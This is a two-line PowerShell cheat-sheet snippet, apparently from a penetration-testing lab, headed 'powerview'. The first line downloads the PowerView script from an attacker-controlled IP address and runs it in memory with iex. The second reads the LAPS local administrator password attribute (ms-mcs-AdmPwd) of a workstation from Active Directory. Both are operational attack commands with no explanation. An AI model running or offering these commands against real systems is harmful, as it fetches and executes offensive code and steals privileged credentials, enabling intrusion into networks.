## powerview

``` powershell
((New-Object Net.WebClient).DownloadString('http://192.168.49.108:8080/PowerView.ps1')) | iex 
Get-DomainObject ws02 -Properties "ms-mcs-AdmPwd"
```